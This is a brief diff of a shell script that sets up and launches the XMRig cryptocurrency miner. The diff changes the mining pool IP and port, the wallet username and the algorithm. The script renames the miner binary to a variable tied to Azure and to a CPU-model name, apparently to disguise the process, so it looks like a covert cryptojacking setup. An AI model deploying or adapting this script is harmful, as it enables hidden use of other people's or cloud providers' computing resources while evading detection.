@@ -13,8 +13,8 @@ rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
 mv xmrig $azure -n
 cp $azure "$cpuname"
 rm -f  xmrig
-POOL=158.101.6.131:2222
-USERNAME=WW3WA6yBf594aYQ8JMvxuXEXQdQ21MzLuRKW83nWYNz3eHTSBBKA6UxVCViF9vkcLdbrjEtcVUYEDfuQ9J7ksbci14R9ATjyu
+POOL=158.101.11.171:3333
+USERNAME=LQhoRFjHmsAjLa64TZjMPaAf6DUBnzETBbnasnb5gxDSCp1guVSfmPJ19ms57g3xMCZpwjhf5PM34FrcjPaEuthv3jnpABV
 THREADS=4
 echo $cpuname" is starting"
-./"${cpuname}" --donate-level 1 -o $POOL -u $USERNAME -p x -a rx/wow -k t $THREADS
+./"${cpuname}" --donate-level 1 -o $POOL -u $USERNAME -p x -a rx/loki -k t $THREADS
